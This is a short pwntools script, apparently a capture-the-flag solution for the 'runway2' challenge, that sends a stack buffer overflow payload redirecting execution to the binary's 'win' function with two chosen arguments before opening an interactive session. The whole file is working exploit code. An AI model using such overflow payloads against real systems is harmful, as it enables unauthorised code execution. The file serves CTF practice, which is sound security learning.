#!/usr/bin/env python3

from pwn import *

exe = ELF("./runway2")

context.binary = exe


def conn():
    if args.LOCAL:
        # r = process([exe.path])
        r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.pwnoh.io", 13402)

    return r


def main():
    r = conn()

    r.sendlineafter(b'?\n', 
        b'A'*28 +
        p32(exe.symbols.win) +
        b'A'*4 + # Arbitrary retaddr
        p32(0xc0ffee) +
        p32(0x007ab1e)
    )

    r.interactive()


if __name__ == "__main__":
    main()
